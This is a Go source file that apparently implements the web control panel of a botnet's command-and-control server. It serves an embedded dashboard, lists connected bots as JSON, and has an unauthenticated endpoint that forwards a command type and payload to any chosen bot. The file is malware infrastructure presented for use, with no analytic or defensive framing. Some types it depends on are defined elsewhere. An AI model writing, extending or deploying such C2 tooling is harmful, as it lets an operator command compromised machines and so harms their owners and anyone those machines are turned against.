package main

import (
    "embed"
    "encoding/json"
    "net/http"
    "sync"
    "time"
)

//go:embed static/*
var staticFiles embed.FS

type WebUI struct {
    c2      *C2Server
    bots    map[string]*Bot
    mu      sync.RWMutex
}

func NewWebUI(c2 *C2Server) *WebUI {
    return &WebUI{
        c2:   c2,
        bots: make(map[string]*Bot),
    }
}

func (ui *WebUI) ServeHTTP(w http.ResponseWriter, r *http.Request) {
    path := r.URL.Path
    if path == "/" {
        path = "/static/index.html"
    }
    
    content, err := staticFiles.ReadFile("static" + path)
    if err != nil {
        http.NotFound(w, r)
        return
    }
    
    w.Header().Set("Content-Type", getMimeType(path))
    w.Write(content)
}

func (ui *WebUI) apiBots(w http.ResponseWriter, r *http.Request) {
    ui.mu.RLock()
    defer ui.mu.RUnlock()
    
    bots := make([]Bot, 0, len(ui.c2.bots))
    for _, b := range ui.c2.bots {
        bots = append(bots, *b)
    }
    json.NewEncoder(w).Encode(bots)
}

func (ui *WebUI) apiCommand(w http.ResponseWriter, r *http.Request) {
    botID := r.URL.Query().Get("bot_id")
    cmdType := r.URL.Query().Get("cmd")
    payload := r.URL.Query().Get("payload")
    
    ui.c2.SendCommand(botID, cmdType, payload)
    w.Write([]byte(`{"status":"sent"}`))
}
